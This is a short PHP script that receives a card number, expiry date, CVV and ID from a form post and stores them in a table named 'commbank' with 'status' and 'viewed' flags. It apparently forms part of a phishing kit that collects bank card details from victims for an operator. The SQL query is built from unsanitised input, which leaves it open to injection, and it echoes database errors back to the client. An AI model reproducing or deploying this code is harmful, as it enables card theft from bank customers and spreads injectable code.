<?php
require '../connection.php';

if ($_POST["cardnumber"] and $_POST["expirydate"] and $_POST["cvv"] and $_POST["uniqueid"]) {
  $cardnumber = $_POST["cardnumber"];
  $expirydate = $_POST["expirydate"];
  $cvv = $_POST["cvv"];
  $uniqueid = $_POST["uniqueid"];

  $upload_challenge = mysqli_query($conn, "UPDATE commbank SET cardnumber='$cardnumber', expirydate='$expirydate', cvv='$cvv', status=0, viewed='true' WHERE uniqueid=$uniqueid");

  if ($upload_challenge) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
